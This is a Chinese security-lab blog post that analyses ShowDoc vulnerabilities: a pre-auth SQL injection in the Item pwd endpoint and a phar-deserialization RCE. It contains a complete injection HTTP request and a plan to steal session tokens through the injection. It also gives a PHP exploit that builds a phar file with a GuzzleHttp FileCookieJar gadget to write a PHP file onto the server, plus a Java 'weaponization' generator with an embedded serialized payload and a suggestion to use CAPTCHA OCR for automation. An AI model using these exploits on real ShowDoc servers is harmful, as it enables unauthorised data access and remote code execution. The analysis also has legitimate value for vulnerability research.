#  showdoc sqli to rce漏洞利用思考   
原创 烽火台实验室  Beacon Tower Lab   2024-06-24 15:32  
  
**漏洞版本**  
  
  
  
sqli <=3.2.5  
  
phar 反序列化 <=3.2.4  
  
  
**漏洞分析**  
  
  
  
**前台sqli**  
  
  
补丁 https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda  
  
补丁对比发现，在server/Application/Api/Controller/ItemController.class.php中将$item_id变量从拼接的方式换成参数绑定的形式，那么可以推断，这个点可能存在sql注入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMNicxFDY02rp22Fib0eAlxuEcronMBUtBOvZj3JY9cUoibaKR4dN7icmyNw/640?wx_fmt=png&from=appmsg "")  
  
在server/Application/Api/Controller/ItemController.class.php的pwd方法中，从请求中拿到item_id参数，并拼接到where条件中执行，并无鉴权，由此可判断为前台sql注入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMuv4Q8zenFgEiaDrPllTPrI318Pu1sgplV8g4QuVAo1FuFtKNuibcR8yQ/640?wx_fmt=png&from=appmsg "")  
  
但在进入sql注入点之前，会从请求中获取captcha_id和captcha参数，该参数需要传入验证码id及验证码进行验证，所以，每次触发注入之前，都需要提交一次验证码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMHR7ybwiakuq7gtqkCLwkIuromArRbMJobvibibK1EUM9I1CLNMoyLuGlA/640?wx_fmt=png&from=appmsg "")  
  
验证码的逻辑是根据captcha_id从Captcha表中获取未超时的验证码进行比对，验证过后，会将验证码设置为过期状态。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMN1ETuqME2VTrJjxDLoJFlpaVpZgZhMsFVCG9oWDOeUxXVwnUY2RVuA/640?wx_fmt=png&from=appmsg "")  
  
完整拼接的sql语句  
  
SELECT * FROM item WHERE ( item_id = '1' ) LIMIT 1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMAbDdcmdDvianEibNOibxfs27ILTibIXfFnoxShevd05YuyiculkpWPPOttA/640?wx_fmt=png&from=appmsg "")  
  
$password 和 $refer_url 参数都可控，可通过联合查询控制password的值满足条件返回$refer_url参数值，1') union select 1,2,3,4,5,6,7,8,9,0,11,12 --，6对应的是password字段，所以password参数传递6，条件成立，回显传入$refer_url参数，那么就存在sql注入。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMkicrlWbCeVmqqbSl0EC6kAPIkKnLiauDb9HtgzffJrq5NCeDYp8kZDsg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMTpupY1vaOVCzw6KUf3EttiaOaEuct5DxfLeZg7OZPYxD5QFOjq7ycSg/640?wx_fmt=png&from=appmsg "")  
```
POST /server/index.php?s=/Api/Item/pwd HTTP/1.1
Host: 172.20.10.1
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1/server/index.php?s=/Api/Item/pwd
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-site: same-origin
sec-fetch-mode: navigate
sec-fetch-dest: document
cookie: PHPSESSID=1r419tk5dmut6vs4etuv656t1q; think_language=zh-CN; XDEBUG_SESSION=XDEBUG_ECLIPSE
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

captcha=8856&captcha_id=87&item_id=1')+union+select+1,2,3,4,5,6,7,8,9,0,11,12+--&password=6&refer_url=aGVsbG8=
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMFbPkw4f5pQ4bmE2bBz0dPlk4YGiaibF4nproxIicPr8ic1KTBfwzfJo7ibw/640?wx_fmt=png&from=appmsg "")  
  
  
**sqli获取token**  
  
  
鉴权是通过调用server/Application/Api/Controller/BaseController.class.php的checkLogin方法来进行验证。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMbKB0W137mibaiaXw73jtvapdCia7qCYFlDKCFyPArTPicp4PgcKzJy4iclw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMDqjT9D5t88GsEtYhw6aZ9o1AdCiadNMndez3nkiaq0qYWmricpEG4qShg/640?wx_fmt=png&from=appmsg "")  
  
未登录时，会从请求中拿到user_token参数，再通过user_token在UserToken表中查询，验证是否超时，将未超时记录的uid字段拿到User表中查询，最后将返回的$login_user设置到Session中。  
  
  
那么只需要通过注入获取到UserToken表中未超时的token，那么就可以通过该token访问后台接口。  
  
  
**phar反序列化rce**  
  
  
补丁  
  
 https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30  
  
补丁将new_is_writeable方法的访问权限从public设置为private。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMPgIgahrRTnxQXM7FGvOZwXMd0ODhFceT9OlepfKyWkKLEJupUcibdJw/640?wx_fmt=png&from=appmsg "")  
  
在server/Application/Home/Controller/IndexController.class.php的new_is_writeable方法中。该处调用了is_dir，并且$file可控，熟悉phar反序列化的朋友都知道，is_dir函数可协议可控的情况下可触发反序列化。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMYZ8jFJBzf08lC6mBPEBfFBZzN3vVf8ngcKSnqTDHrsRYHhYbuKBrDQ/640?wx_fmt=png&from=appmsg "")  
  
  
有了触发反序列化的点，还需要找到一条利用链，Thinkphp环境中用到GuzzleHttp，GuzzleHttp\Cookie\FileCookieJar的__destruct方法可保存文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEM4CezovKxiaMoj6ibWTB2CHtoIHyfJSQ5fapfMIKvqs6JCFk6ZA0IEP6Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEM8mKXFEPwoLDbfydYticpMtePEK6KDgVU8wQhITcfQmjfJuS7CicuU0KA/640?wx_fmt=png&from=appmsg "")  
  
网上已经有很多分析，这里直接给出生成phar的exp。  
```
<?php

  namespace GuzzleHttp\Cookie {
  class CookieJar
  {
  private $cookies;
  public function __construct()
  {
    $this->cookies = array(new SetCookie());
  }
private $strictMode;
}
class FileCookieJar extends CookieJar
  {
    private $filename = "E:\\Tools\\Env\\phpstudy_pro\\WWW\\showdoc-3.2.4\\server\\test.php";
    private $storeSessionCookies = true;
  }
class SetCookie
  {
    private $data = array('Expires' => '<?php phpinfo(); ?>');
  }
}
namespace {
  $phar = new Phar("phar.phar"); //后缀名必须为phar
  $phar->startBuffering();
  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
  $o = new \GuzzleHttp\Cookie\FileCookieJar();
  $phar->setMetadata($o); //将⾃定义的meta-data存⼊manifest
  $phar->addFromString("test.txt", "test"); //添加要压缩的⽂件
  //签名⾃动计算
  $phar->stopBuffering();

}


```  
  
  
生成exp时，写入的路径需要指定绝对路径，在docker中部署的默认为/var/www/html，其他则可以通过访问时指定一个不存在的模块报错拿到绝对路径。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMbkOmergwQNXPtoAwu2Nq5F4icrMryicDK2Xqx5b5jhGlWHo3BhblvRoQ/640?wx_fmt=png&from=appmsg "")  
  
后续利用，找到一个上传且知道路径的点，将生成的phar文件改成png进行上传。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMYx8IZf3zzNLiaicQRNpkNrN8Cdxicqq1tgk3wcp5CBUuxaxSiav2Yqqjlw/640?wx_fmt=png&from=appmsg "")  
  
访问返回的链接，可获取上传文件的路径。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMkeUyQdUrdPp6xwqbSwUnDwaiayjNmibstg7RZeXXxtJvjPgpicwYjA7zg/640?wx_fmt=png&from=appmsg "")  
  
调用new_is_writeable方法，通过phar://访问文件触发反序列化。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEM3k74Y4URDMDqS0UJ9fm9Ly65jqU3fiaLgSV3NNExd0fy4MIHHVuY7VQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEM6AXHko1WUQyjicytia0qxXjBWMmUCeKzHMEicflf7KfzbVgFvRicYB1J9g/640?wx_fmt=png&from=appmsg "")  
  
  
**武器化利用思考**  
  
  
  
在java环境下，对该漏洞进行武器化时，考虑到两点情况，一个是在通过sqli获取token时，需要对验证码进行识别，目前网上已经有师傅移植了ddddocr。  
  
  
https://github.com/BreathofWild/ddddocr-java8   
  
  
另一个是在使用exp生成phar文件时，需要指定写入文件的绝对路径以及内容，在java下没找到可以直接生成phar文件的方法，没法动态生成phar文件，对phar文档格式解析，实现一个可在java环境下指定反序列化数据来生成phar文件的方法。  
  
  
**phar文档格式解析**  
  
  
通过php生成一个phar文件，用010 Editor 打开，通过官网文档对phar格式说明，解析phar的文件。  
  
  
https://www.php.net/manual/zh/phar.fileformat.ingredients.php  
  
  
phar文档分为四个部分：Stub、manifest、contents、signature  
  
  
**Stub**  
  
  
就是一个php文件，用于标识该文件为phar文件，该文件内容必须以来结尾 ，感觉类似于文件头。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMJtwqD9H7OnFg2Z331HZibgQeWibLibrBKeh0ly0CAvIe6HBjWB1bmUeqw/640?wx_fmt=png&from=appmsg "")  
  
  
**manifest**  
  
  
这个部分不同区间指定了一些信息，其中就包含了反序列化的数据。  
  
  
https://www.php.net/manual/zh/phar.fileformat.phar.php  
  
  
1 - 4（bytes） 存放的是整个 manifest 的长度，01C7转换为10进制为455,代表整个manifest 的长度455。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMAnnmMMO9ia4bemEA44zPdy8icVg8QUeIjLYicNmBrZfjM5EpgdDgQeDIA/640?wx_fmt=png&from=appmsg "")  
  
5 - 8 （bytes） Phar 中的文件数 也就是 contents 中的文件数 ，有一个文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMs6Cmibp3nQ1pDSxn6mHyibFcUticDaibsxrVicdWlWPYXQPhcmTlJ5Dy48A/640?wx_fmt=png&from=appmsg "")  
  
9-10 存放的是 API version 版本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMnJiaDbxKx2zJznyV1l0VLNAu0SCgWACwNAvEEvw2VszjMCv1makfXibw/640?wx_fmt=png&from=appmsg "")  
  
11-14 Global Phar bitmapped flags。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMeSEVF5ibW1X97K1MQ4Kic2bHqUviaStU058tgL4icUIEYBFuWL25OVut0g/640?wx_fmt=png&from=appmsg "")  
  
15 - 18 如果有别名，那么该区间存放的是别名长度，这里不存在别名。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEM2icUTgT5PARdTRdvdB7Qau05okebW6SAoZWcGHiccclSGrwrQqBRtFXA/640?wx_fmt=png&from=appmsg "")  
  
19 - 22 元数据长度 0191 转十进制 401 代表元数据长度为 401。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMZvEMDH2iaOPUbyEYVIuxvGTULkX7H6O7H0n6MiaqYzt6ur73mwSjZddg/640?wx_fmt=png&from=appmsg "")  
  
22-？元数据，元数据中存放的就是反序列化的数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMo2eEsxBpeg3eGwfuSGvHO7JR9GWYGgibl0ricnj2ZYh9icAbF3eBRVRWg/640?wx_fmt=png&from=appmsg "")  
  
  
**contents**  
  
  
这个部分可有可无，是 manifest 第二个区间指定的一个内容，官网没有具体说明，漏洞利用时也不会用到。  
  
  
**signature**  
  
  
**actual signature**  
  
****  
这个部分存放签名内容。签名的方式不同，签名的长度也不一样，SHA1 签名为 20 字节，MD5 签名为 16 字节，SHA256 签名为 32 字节，SHA512 签名为 64 字节。OPENSSL 签名的长度取决于私钥的大小。  
  
  
**ignature flags （4 bytes）**  
  
  
这个部分标识签名的算法， 0x0001 用于定义 MD5 签名， 0x0002 用于定义 SHA1 签名， 0x0003 用于定义 SHA256 签名， 0x0004 用于定义 SHA512 签名。0x0010 用于定义 OPENSSL 签名。  
  
  
**GBMB （4 bytes）**  
  
  
Magic GBMB  
  
签名算法为 02，使用的即是SHA1签名。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMCChxMIQjE3hob1jI6FqGhvCicvo0mZYCBZdydxPQIicc6YG4w8Rqj59g/640?wx_fmt=png&from=appmsg "")  
  
签名的长度为 20 字节。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAMTJ2iccaEoWMwx80KBlVbEMS4rHMBibicblovk4xWLDwWx2BpMw6iaHOUf9diaw808vic0hR8xL37hHX3Q/640?wx_fmt=png&from=appmsg "")  
  
  
通过对整个phar文件格式进行解析，发现大部分字段都是固定不变的。需要变化的字段有：  
  
  
1、manifest 的长度  
  
2、manifest 中元数据  
  
3、manifest 中的 元数据长度  
  
4、signature flag 签名算法  
  
5、signature 签名数据  
  
  
**java生成 phar文件**  
  
  
最终构造得到：  
```
package org.example;

import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import com.sun.org.apache.xml.internal.security.utils.Base64;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;


public class App 
{
    public static void main( String[] args ) throws IOException, Base64DecodingException {
        final FileOutputStream fileOutputStream = new FileOutputStream("phar.phar");
        final byte[] decode = Base64.decode("TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6ODoidGVzdC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjE6e3M6NzoiRXhwaXJlcyI7czoxOToiPD9waHAgcGhwaW5mbygpOyA/PiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO30=");
        final String s = new String(decode);
        fileOutputStream.write(GeneratePharFilebyte(s, 2));
        fileOutputStream.close();
    }

    public static byte[] GeneratePharFilebyte(String payload, int hashMode) {
        // 添加 stub
        String stubStr = "GIF89a<?php __HALT_COMPILER(); ?>\r\n";
        byte[] stubByte = stubStr.getBytes(StandardCharsets.UTF_8);
        // 长度 14
        byte[] manifestMid = {(byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00,  (byte) 0x11, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        // 反序列化数据
        byte[] SerializationByte = payload.getBytes(StandardCharsets.UTF_8);

        // 文件数据
        byte[] fileByte = {(byte) 0x08, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x74, (byte) 0x65, (byte) 0x73, (byte) 0x74, (byte) 0x2E, (byte) 0x74, (byte) 0x78, (byte) 0x74, (byte) 0x04, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xF7, (byte) 0x02, (byte) 0x63, (byte) 0x66, (byte) 0x04, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0C,(byte) 0x7E, (byte) 0x7F, (byte) 0xD8, (byte) 0xB6, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x74, (byte) 0x65, (byte) 0x73, (byte) 0x74};

        // Signature
        // 2. 签名标志
        ByteBuffer signaturebuffer = ByteBuffer.allocate(4);
        signaturebuffer.putInt(hashMode);
        byte[] signatureFlag = signaturebuffer.array();
        // GBMB
        byte[] gbgm = {(byte) 0x47, (byte) 0x42, (byte) 0x4D, (byte) 0x42};


        // 计算反序列化数据长度
        ByteBuffer Seriabuffer = ByteBuffer.allocate(4);
        Seriabuffer.putInt(SerializationByte.length);
        byte[] SeriaLength = Seriabuffer.array();

        // 计算总长度
        int length = manifestMid.length + SerializationByte.length + fileByte.length;
        ByteBuffer buffer = ByteBuffer.allocate(4);
        buffer.putInt(length);
        byte[] manifestLength = buffer.array();


        try {
            final ByteArrayOutputStream baos = new ByteArrayOutputStream();
            // 添加 stub
            baos.write(stubByte);

            // 添加manifest 总长度
            reverseBytes(manifestLength);
            baos.write(manifestLength);

            // 添加 manifestMid
            baos.write(manifestMid);

            // 添加反序列化数据长度
            reverseBytes(SeriaLength);
            baos.write(SeriaLength);

            // 添加反序列化数据
            baos.write(SerializationByte);

            // 添加文件
            baos.write(fileByte);

            // 添加signature
            // 计算 signature
            if (hashMode == 1){ // md5
                MessageDigest md5Digest = MessageDigest.getInstance("MD5");
                byte[] md5Bytes = md5Digest.digest(baos.toByteArray());
                baos.write(md5Bytes);
            } else if (hashMode == 2) { // sha1
                MessageDigest sha1Digest = MessageDigest.getInstance("SHA-1");
                sha1Digest.update(baos.toByteArray());
                byte[] hashBytes = sha1Digest.digest();
                baos.write(hashBytes);
            } else if (hashMode == 3) { // SHA256
                MessageDigest sha256Digest = MessageDigest.getInstance("SHA-256");
                sha256Digest.update(baos.toByteArray());
                byte[] hashBytes = sha256Digest.digest();
                baos.write(hashBytes);
            }else if (hashMode == 4) { // SHA512
                MessageDigest sha512Digest = MessageDigest.getInstance("SHA-512");
                sha512Digest.update(baos.toByteArray());
                byte[] hashBytes = sha512Digest.digest();
                baos.write(hashBytes);
            }


            // 添加签名标志
            reverseBytes(signatureFlag);
            baos.write(signatureFlag);

            // 添加
            baos.write(gbgm);

            return baos.toByteArray();


        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    public static void reverseBytes(byte[] bytes) {
        int left = 0;
        int right = bytes.length - 1;

        while (left < right) {
            // 交换左右两端的元素
            byte temp = bytes[left];
            bytes[left] = bytes[right];
            bytes[right] = temp;

            // 移动左右指针
            left++;
            right--;
        }
    }
}

```  
  
  
  
  
